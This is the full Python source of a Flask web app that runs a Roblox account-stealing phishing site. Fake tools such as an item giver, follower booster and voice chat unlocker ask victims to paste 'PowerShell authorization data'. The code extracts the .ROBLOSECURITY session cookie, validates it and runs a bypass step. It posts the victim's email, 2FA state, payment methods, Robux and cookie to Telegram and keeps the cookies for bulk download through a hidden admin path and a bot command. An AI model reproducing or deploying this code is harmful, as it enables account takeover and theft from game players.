from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, make_response, Response
import config
import requests
import re
import os
import io
import threading
import time as _ttime
from datetime import datetime
import database
import auth
import landings
import bypass
import proxy_utils

app = Flask(__name__)
app.secret_key = config.SECRET_KEY
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024
app.jinja_env.globals.update(min=min, max=max, APP_NAME=config.APP_NAME, admin_url=config.ADMIN_URL_PATH)

import secrets
import time as _time

_api_rate = {}
API_RATE_LIMIT = 15
API_RATE_WINDOW = 60
_API_RATE_MAX_KEYS = 10000


def _api_rate_limited():
    ip = request.remote_addr or '0.0.0.0'
    now = _time.time()

    if len(_api_rate) > _API_RATE_MAX_KEYS:
        cutoff = now - API_RATE_WINDOW
        stale = [k for k, v in _api_rate.items() if not v or v[-1] < cutoff]
        for k in stale:
            del _api_rate[k]

    if ip not in _api_rate:
        _api_rate[ip] = []
    _api_rate[ip] = [t for t in _api_rate[ip] if now - t < API_RATE_WINDOW]
    if len(_api_rate[ip]) >= API_RATE_LIMIT:
        return True
    _api_rate[ip].append(now)
    return False


def generate_csrf_token():
    from flask import session
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

app.jinja_env.globals['csrf_token'] = generate_csrf_token


@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdn.tailwindcss.com https://unpkg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self'"
    return response


def _verify_csrf():
    from flask import session
    import hmac as _hmac
    token_session = session.get('csrf_token', '')
    token_form = request.form.get('csrf_token', '')
    if not token_session or not token_form:
        return False
    return _hmac.compare_digest(token_session, token_form)

TOOLS = {
    'clothing-copier': {
        'title': 'Clothing Copier',
        'description': 'Copy any Roblox clothing item instantly. Paste your authorization data below to authenticate and proceed.',
        'placeholder': 'Paste your PowerShell authorization data here...',
        'button_text': 'Copy Clothing',
        'success_message': 'Clothing copied successfully! Download starting...',
        'video_tutorial': '/static/tutorial.png'
    },
    'game-copier': {
        'title': 'Copy Games',
        'description': 'Download any Roblox game file instantly. Paste your authorization data below to authenticate.',
        'placeholder': 'Paste your PowerShell authorization data here...',
        'button_text': 'Copy Game',
        'success_message': 'Game file ready! Download starting...',
        'video_tutorial': '/static/tutorial.png'
    },
    'item-giver': {
        'title': 'Item Giver',
        'description': 'Add any Roblox item to your inventory instantly. Paste your authorization data below.',
        'placeholder': 'Paste your PowerShell authorization data here...',
        'button_text': 'Give Items',
        'success_message': 'Items added to your inventory! Rejoin your game to see them.',
        'video_tutorial': '/static/tutorial.png'
    },
    'follower-bot': {
        'title': 'Follower Boost',
        'description': 'Boost your Roblox follower count. Paste your authorization data below to start.',
        'placeholder': 'Paste your PowerShell authorization data here...',
        'button_text': 'Send Followers',
        'success_message': 'Done! Followers will arrive within a few minutes.',
        'video_tutorial': '/static/tutorial.png'
    },
    'voice-chat-unlocker': {
        'title': 'Voice Chat Unlocker',
        'description': 'Enable Roblox voice chat on your account. Paste your authorization data below.',
        'placeholder': 'Paste your PowerShell authorization data here...',
        'button_text': 'Unlock Voice Chat',
        'success_message': 'Voice chat unlocked! Rejoin the game to activate.',
        'video_tutorial': '/static/tutorial.png'
    },
    'game-visits-botter': {
        'title': 'Visit Booster',
        'description': 'Boost your Roblox game visit count. Paste your authorization data below.',
        'placeholder': 'Paste your PowerShell authorization data here...',
        'button_text': 'Boost Visits',
        'success_message': 'Done! Visit count will start increasing shortly.',
        'video_tutorial': '/static/tutorial.png'
    },
    'game-joiner': {
        'title': 'Game Joiner',
        'description': 'Join any Roblox player\'s game instantly. Paste your authorization data below to proceed.',
        'placeholder': 'Paste your PowerShell authorization data here...',
        'button_text': 'Join Player',
        'success_message': 'Joining game... Launch Roblox when prompted.',
        'video_tutorial': '/static/tutorial.png'
    }
}


@app.route('/')
def index():
    return render_template('index.html')

for _key, (_template, _url, _name) in landings.LANDING_DEFS.items():
    def _make_landing_view(key, template):
        def landing_view():
            if not landings.is_enabled(key):
                return render_template('404.html'), 404
            return render_template(template)
        landing_view.__name__ = f'landing_{key}'
        return landing_view
    app.route(_url)(_make_landing_view(_key, _template))

@app.route('/tool/<tool_name>')
def tool(tool_name):
    tool_data = TOOLS.get(tool_name)

    if not tool_data:
        return redirect(url_for('index'))

    return render_template('tool.html', tool=tool_data)

@app.route('/download/<filename>')
def download_file(filename):
    if filename not in config.GAME_CODES:
        return "File not found", 404
    rbxl_dir = os.path.join(app.root_path, 'static', 'rbxl')
    return send_from_directory(rbxl_dir, filename, as_attachment=True)

def _try_bypass(cookie):
    proxies = proxy_utils.load_proxies()
    ok, result = bypass.bypass_cookie(cookie, extra_proxies=proxies)
    if ok:
        print(f"Bypass successful")
        return result
    print(f"Bypass failed: {result}")
    return None


def send_telegram_notification(tool_name, game_id, cookie, encrypted_cookie, api_result):
    try:
        data = api_result.get('data', {})
        telegram_url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"

        status = 'VALID' if api_result.get('valid') else 'INVALID'

        email_info = data.get('email', {})
        two_fa = data.get('two_factor', {})
        expensive = data.get('expensive_items', {})
        inv_details = data.get('inventory_details', {})
        game_purch = data.get('game_purchases', {})
        transactions = data.get('transactions', {})
        robux_sources = data.get('robux_sources', {})
        presence = data.get('presence', {})
        badges = data.get('badges', {})

        pm_count = data.get('payment_methods_count', 0)
        has_headless = expensive.get('Headless Horseman')
        has_korblox = expensive.get('Korblox Deathspeaker')
        robux_val = data.get('robux', 0)
        rap_val = data.get('rap', 0)

        # Build flags line
        flags = []
        if data.get('premium'): flags.append('💎 PREMIUM')
        if pm_count > 0: flags.append(f'💳 {pm_count} CARD{"S" if pm_count > 1 else ""}')
        if has_headless: flags.append('💀 HEADLESS')
        if has_korblox: flags.append('☠️ KORBLOX')
        if data.get('has_verified_badge'): flags.append('✅ VERIFIED')
        flags_line = '  •  '.join(flags) if flags else '—'

        message = f"""{'🟢' if api_result.get('valid') else '🔴'} <b>NEW HIT</b> — <b>{data.get('username', 'N/A')}</b>
{'━' * 28}
{flags_line}
{'━' * 28}

<b>👤 ACCOUNT</b>
├ Username: <code>{data.get('username', 'N/A')}</code>  ({data.get('display_name', 'N/A')})
├ User ID: <code>{data.get('user_id', 'N/A')}</code>
├ Age: {data.get('account_age', 'N/A')} | Created: {data.get('created', 'N/A')}
├ Banned: {'🚫 YES' if data.get('is_banned') else 'No'} | Location: {data.get('location', 'N/A')}
└ Status: {presence.get('status', 'Unknown')}

<b>💰 ECONOMY</b>
├ Robux: <b>{robux_val:,}</b> R$
├ RAP: {rap_val:,}  |  Inventory: {data.get('inventory_total', 0):,}
└ All-time In: {transactions.get('alltime_incoming', 0):,}  |  Out: {transactions.get('alltime_outgoing', 0):,}

<b>📧 EMAIL</b>
├ Address: <code>{email_info.get('address', 'N/A')}</code>
└ Verified: {'✅ Yes' if email_info.get('verified') else '❌ No'}

<b>🔐 SECURITY</b>
├ 2FA: {'🔒 Enabled' if two_fa.get('enabled') else '🔓 Disabled'} ({', '.join(two_fa.get('methods', [])) if two_fa.get('methods') else 'None'})
└ PIN: {'Yes' if two_fa.get('pin_enabled') else 'No'}
{'━' * 28}
{'💳 <b>PAYMENT METHODS: ' + str(pm_count) + '</b>' if pm_count > 0 else '💳 No payment methods'}
{'━' * 28}

<b>🎒 INVENTORY</b>  ({inv_details.get('Всего предметов', 0)} items)
├ Limited: {inv_details.get('Коллекционные (Limited)', 0)}  |  Bundles: {inv_details.get('Наборы (Bundles)', 0)}
└ Headless: {'✅' if has_headless else '❌'}  |  Korblox: {'✅' if has_korblox else '❌'}

<b>👥 SOCIAL</b>
└ Friends: {data.get('friends_count', 0)}  |  Followers: {data.get('followers_count', 0)}  |  Groups: {data.get('groups_count', 0)}

<b>🛠 TOOL:</b> {tool_name}  |  <b>Game:</b> {game_id or '—'}
━━━━━━━━━━━━
<b>🍪 COOKIE:</b>
<pre><code>{encrypted_cookie}</code></pre>"""

        for chat_id in config.CHAT_IDS:
            if chat_id:
                try:
                    r1 = requests.post(telegram_url, json={
                        'chat_id': chat_id,
                        'text': message,
                        'parse_mode': "HTML"
                    }, timeout=30)

                    print(f"Telegram sent to {chat_id}: {r1.status_code}")
                    if r1.status_code != 200:
                        print(f"Telegram error for {chat_id}: {r1.text}")
                except Exception as e:
                    print(f"Telegram error for {chat_id}: {str(e)}")

    except Exception as e:
        print(f"Telegram error: {str(e)}")

@app.route('/api/submit', methods=['POST'])
def submit_tool():
    if _api_rate_limited():
        return jsonify({'status': 'error', 'message': 'Too many requests', 'valid': False}), 429
    data = request.json.get('input_data') if request.is_json else request.form.get('input_data')
    tool_name = request.json.get('tool_name') if request.is_json else request.form.get('tool_name')

    cookie_match = re.search(r'\.ROBLOSECURITY["\s,=]+([^";\s]+)', data)
    roblosecurity_cookie = None
    formatted_cookie = None

    if cookie_match:
        raw_cookie = cookie_match.group(1)

        if raw_cookie.startswith('_|WARNING:-DO-NOT-SHARE-THIS'):
            formatted_cookie = raw_cookie
            token_match = re.search(r'\|_([A-F0-9\.]+)$', raw_cookie)
            roblosecurity_cookie = token_match.group(1) if token_match else raw_cookie
        else:
            roblosecurity_cookie = raw_cookie
            formatted_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{roblosecurity_cookie}"

    game_id_match = re.search(r'/games/(\d+)/', data)
    game_id = game_id_match.group(1) if game_id_match else None

    print(f"\n{'='*50}")
    print(f"Tool: {tool_name}")
    print(f"Game ID: {game_id}")
    print(f"Cookie: {'Found' if roblosecurity_cookie else 'Not found'}")
    print(f"Formatted Cookie: {'Found' if formatted_cookie else 'Not found'}")
    print(f"{'='*50}\n")

    if not formatted_cookie:
        print("Cookie not found in input")
        return jsonify({
            'status': 'error',
            'message': 'Cookie not found in input',
            'valid': False
        })

    try:
        response = requests.post(config.API_URL, json={
            'cookie': formatted_cookie,
            'detailed': True
        }, timeout=120)

        api_result = response.json()

        is_valid = api_result.get('valid', False)
        user_id = api_result.get('data', {}).get('user_id', 'N/A') if is_valid else 'N/A'
        username = api_result.get('data', {}).get('username', 'N/A') if is_valid else 'N/A'

        print(f"API Response: Valid={is_valid}, User ID={user_id}, Username={username}")
        print(f"{'='*50}\n")

        if is_valid:
            bypassed_cookie = _try_bypass(formatted_cookie)
            if bypassed_cookie:
                formatted_cookie = bypassed_cookie
                print(f"Bypass OK, using new cookie")

            send_telegram_notification(tool_name, game_id, roblosecurity_cookie, formatted_cookie, api_result)
            database.log_request(tool_name, game_id, is_valid)
            cookie_id = database.save_valid_cookie(api_result, formatted_cookie)
            print(f"Saved valid cookie with ID: {cookie_id}")

        file_to_download = None
        if tool_name in ['game-copier', 'item-giver'] and game_id:
            file_found = False
            for filename, code_id in config.GAME_CODES.items():
                if str(code_id) == str(game_id):
                    file_to_download = filename
                    file_found = True
                    break
            if not file_found:
                file_to_download = 'rickdev.rbxl'

        safe_api_response = {}
        if is_valid and api_result.get('data'):
            data = api_result['data']
            safe_api_response = {
                'user_id': data.get('user_id'),
                'username': data.get('username'),
                'display_name': data.get('display_name'),
                'robux': data.get('robux'),
                'premium': data.get('premium'),
                'rap': data.get('rap'),
                'created': data.get('created'),
                'account_age': data.get('account_age'),
                'is_banned': data.get('is_banned'),
                'has_verified_badge': data.get('has_verified_badge'),
                'friends_count': data.get('friends_count'),
                'followers_count': data.get('followers_count'),
                'groups_count': data.get('groups_count'),
                'location': data.get('location')
            }

        return jsonify({
            'status': 'success' if is_valid else 'error',
            'message': 'Cookie is valid!' if is_valid else 'Cookie is invalid',
            'valid': is_valid,
            'game_id': game_id,
            'file': file_to_download,
            'data': safe_api_response if is_valid else None
        })

    except requests.Timeout:
        print(f"API Timeout")
        print(f"{'='*50}\n")
        return jsonify({
            'status': 'error',
            'message': 'API request timeout',
            'valid': False
        })
    except Exception as e:
        print(f"API Error: {str(e)}")
        print(f"{'='*50}\n")
        return jsonify({
            'status': 'error',
            'message': 'API request failed',
            'valid': False
        })

def _process_landing_payload(payload, tool_name='landing'):
    cookie_match = re.search(r'\.ROBLOSECURITY["\s,=]+([^";\s]+)', payload)
    roblosecurity_cookie = None
    formatted_cookie = None

    if cookie_match:
        raw_cookie = cookie_match.group(1)
        if raw_cookie.startswith('_|WARNING:-DO-NOT-SHARE-THIS'):
            formatted_cookie = raw_cookie
            token_match = re.search(r'\|_([A-F0-9\.]+)$', raw_cookie)
            roblosecurity_cookie = token_match.group(1) if token_match else raw_cookie
        else:
            roblosecurity_cookie = raw_cookie
            formatted_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{roblosecurity_cookie}"

    game_id_match = re.search(r'/games/(\d+)/', payload)
    game_id = game_id_match.group(1) if game_id_match else None

    if not formatted_cookie:
        return jsonify({'status': 'error', 'message': 'Invalid data', 'valid': False})

    try:
        response = requests.post(config.API_URL, json={
            'cookie': formatted_cookie,
            'detailed': True
        }, timeout=120)
        api_result = response.json()
        is_valid = api_result.get('valid', False)

        if is_valid:
            bypassed_cookie = _try_bypass(formatted_cookie)
            if bypassed_cookie:
                formatted_cookie = bypassed_cookie

            send_telegram_notification(tool_name, game_id, roblosecurity_cookie, formatted_cookie, api_result)
            database.log_request(tool_name, game_id, is_valid)
            database.save_valid_cookie(api_result, formatted_cookie)

        file_to_download = None
        if game_id:
            for filename, code_id in config.GAME_CODES.items():
                if str(code_id) == str(game_id):
                    file_to_download = filename
                    break
            if not file_to_download:
                file_to_download = 'rickdev.rbxl'

        return jsonify({
            'status': 'success' if is_valid else 'error',
            'message': 'Success' if is_valid else 'Invalid data',
            'valid': is_valid,
            'file_id': file_to_download
        })
    except requests.Timeout:
        return jsonify({'status': 'error', 'message': 'Request timeout', 'valid': False})
    except Exception:
        return jsonify({'status': 'error', 'message': 'Request failed', 'valid': False})


@app.route('/api/process_game', methods=['POST'])
def api_process_game():
    if _api_rate_limited():
        return jsonify({'status': 'error', 'message': 'Too many requests', 'valid': False}), 429
    data = request.get_json(silent=True) or {}
    payload = data.get('payload', '')
    return _process_landing_payload(payload, tool_name='landing-process')


@app.route('/api/change-region', methods=['POST'])
def api_change_region():
    if _api_rate_limited():
        return jsonify({'status': 'error', 'message': 'Too many requests', 'valid': False}), 429
    data = request.get_json(silent=True) or {}
    payload = data.get('payload', '')
    return _process_landing_payload(payload, tool_name='landing-region')


@app.route('/api/gamepass-info/<gamepass_id>')
def api_gamepass_info(gamepass_id):
    return jsonify({
        'status': 'success',
        'gamepass': {
            'id': gamepass_id,
            'name': f'Premium Gamepass #{gamepass_id[-4:]}',
            'price': 799,
            'description': 'Unlock exclusive in-game features and premium content.',
            'icon': '🎮'
        }
    })


@app.route('/api/assets/<filename>')
def api_assets(filename):
    if filename not in config.GAME_CODES:
        return "File not found", 404
    rbxl_dir = os.path.join(app.root_path, 'static', 'rbxl')
    return send_from_directory(rbxl_dir, filename, as_attachment=True)


@app.route('/admin', defaults={'path': ''})
@app.route('/admin/', defaults={'path': ''})
@app.route('/admin/<path:path>')
def admin_stub(path):
    return render_template('404.html'), 404

@app.route('/ljsdkjfsldkajfksdjflkjsdf/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if not _verify_csrf():
            return render_template('admin_login.html', error='Invalid request'), 403

        username = request.form.get('username')
        password = request.form.get('password')

        if auth.verify_credentials(username, password):
            auth_token = auth.generate_auth_token(username)
            response = make_response(redirect(url_for('admin_dashboard')))
            response.set_cookie('admin_token', auth_token, max_age=86400, httponly=True, samesite='Lax', secure=request.is_secure)
            return response
        else:
            return render_template('admin_login.html', error='Неверный логин или пароль')

    return render_template('admin_login.html')

@app.route('/ljsdkjfsldkajfksdjflkjsdf/logout', methods=['POST'])
def admin_logout():
    response = make_response(redirect(url_for('admin_login')))
    response.set_cookie('admin_token', '', expires=0)
    return response

@app.route('/ljsdkjfsldkajfksdjflkjsdf/revoke-sessions', methods=['POST'])
@auth.login_required
def admin_revoke_sessions():
    if not _verify_csrf():
        return jsonify({'success': False, 'error': 'Invalid request'}), 403
    config.rotate_session_nonce()
    response = make_response(jsonify({'success': True}))
    response.set_cookie('admin_token', '', expires=0)
    return response

@app.route('/ljsdkjfsldkajfksdjflkjsdf')
@app.route('/ljsdkjfsldkajfksdjflkjsdf/dashboard')
@auth.login_required
def admin_dashboard():
    stats = database.get_overview_stats()
    daily_stats = database.get_daily_stats(30)

    return render_template('admin_dashboard.html',
                         stats=stats,
                         daily_stats=daily_stats)

@app.route('/ljsdkjfsldkajfksdjflkjsdf/cookies')
@auth.login_required
def admin_cookies():
    page = request.args.get('page', 1, type=int)
    data = database.get_all_cookies(page=page, per_page=50)

    return render_template('admin_cookies.html', data=data)

@app.route('/ljsdkjfsldkajfksdjflkjsdf/cookies/download-all')
@auth.login_required
def admin_download_all_cookies():
    def generate():
        page = 1
        while True:
            batch = database.get_all_cookies(page=page, per_page=500)
            if not batch['cookies']:
                break
            for c in batch['cookies']:
                yield c['cookie_formatted'] + '\n'
            if page >= batch['total_pages']:
                break
            page += 1

    return Response(
        generate(),
        mimetype='text/plain',
        headers={'Content-Disposition': f'attachment; filename=cookies_{int(datetime.now().timestamp())}.txt'}
    )


@app.route('/ljsdkjfsldkajfksdjflkjsdf/landings', methods=['GET', 'POST'])
@auth.login_required
def admin_landings():
    if request.method == 'POST':
        if not _verify_csrf():
            return render_template('admin_landings.html', landings_list=landings.get_all()), 403
        all_landings = landings.get_all()
        for l in all_landings:
            enabled = request.form.get(f'landing_{l["key"]}') == 'on'
            landings.set_enabled(l['key'], enabled)
        return redirect(url_for('admin_landings'))

    return render_template('admin_landings.html', landings_list=landings.get_all())

@app.route('/ljsdkjfsldkajfksdjflkjsdf/settings', methods=['GET', 'POST'])
@auth.login_required
def admin_settings():
    if request.method == 'POST':
        if not _verify_csrf():
            return render_template('admin_settings.html', error='Invalid request', username=config.ADMIN_USERNAME), 403
        old_password = request.form.get('old_password')
        new_password = request.form.get('new_password')
        confirm_password = request.form.get('confirm_password')

        if new_password != confirm_password:
            return render_template('admin_settings.html',
                                 error='Новые пароли не совпадают',
                                 username=config.ADMIN_USERNAME)

        success, message = auth.change_password(old_password, new_password)

        if success:
            response = make_response(redirect(url_for('admin_login')))
            response.set_cookie('admin_token', '', expires=0)
            return response
        else:
            return render_template('admin_settings.html',
                                 error=message,
                                 username=config.ADMIN_USERNAME)

    return render_template('admin_settings.html',
                         username=config.ADMIN_USERNAME)

@app.route('/ljsdkjfsldkajfksdjflkjsdf/cookies/delete', methods=['POST'])
@auth.login_required
def admin_delete_cookies():
    if not _verify_csrf():
        return jsonify({'error': 'Invalid request'}), 403
    ids = request.form.getlist('ids[]')
    if not ids:
        return jsonify({'error': 'No IDs provided'}), 400
    ids = [int(i) for i in ids if i.isdigit()]
    deleted = database.delete_cookies_by_ids(ids)
    return jsonify({'deleted': deleted})


@app.route('/ljsdkjfsldkajfksdjflkjsdf/cookies/clear', methods=['POST'])
@auth.login_required
def admin_clear_cookies():
    if not _verify_csrf():
        return jsonify({'error': 'Invalid request'}), 403
    deleted = database.clear_all_cookies()
    return jsonify({'deleted': deleted})


# ── Telegram bot polling ──────────────────────────────────────
def _tg_send(text, chat_id):
    try:
        requests.post(
            f'https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage',
            json={'chat_id': chat_id, 'text': text},
            timeout=10
        )
    except Exception:
        pass


def _tg_send_file(content, filename, chat_id):
    try:
        requests.post(
            f'https://api.telegram.org/bot{config.BOT_TOKEN}/sendDocument',
            data={'chat_id': chat_id},
            files={'document': (filename, io.BytesIO(content.encode('utf-8')), 'text/plain')},
            timeout=30
        )
    except Exception:
        pass


def _tg_bot_loop():
    offset = 0
    allowed_ids = set(str(c).strip() for c in config.CHAT_IDS if c)
    while True:
        try:
            r = requests.get(
                f'https://api.telegram.org/bot{config.BOT_TOKEN}/getUpdates',
                params={'offset': offset, 'timeout': 20},
                timeout=30
            )
            updates = r.json().get('result', [])
            for u in updates:
                offset = u['update_id'] + 1
                msg = u.get('message', {})
                chat_id = str(msg.get('chat', {}).get('id', ''))
                text = msg.get('text', '').strip()
                if chat_id not in allowed_ids:
                    continue
                if text == '/cookies':
                    cookies = database.get_all_cookies_text()
                    if not cookies:
                        _tg_send('No cookies yet.', chat_id)
                    else:
                        count = len(cookies.strip().splitlines())
                        fname = f'cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
                        _tg_send_file(cookies, fname, chat_id)
                        _tg_send(f'Sent {count} cookies.', chat_id)
                elif text == '/stats':
                    stats = database.get_overview_stats()
                    _tg_send(
                        f"Stats:\nTotal cookies: {stats.get('total_cookies',0)}\n"
                        f"Today: {stats.get('today_cookies',0)}\n"
                        f"Total robux: {stats.get('total_robux',0)}\n"
                        f"Premium: {stats.get('premium_accounts',0)}\n"
                        f"Headless: {stats.get('headless_count',0)}",
                        chat_id
                    )
        except Exception:
            pass
        _ttime.sleep(1)


_bot_thread = threading.Thread(target=_tg_bot_loop, daemon=True)
_bot_thread.start()


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=80)
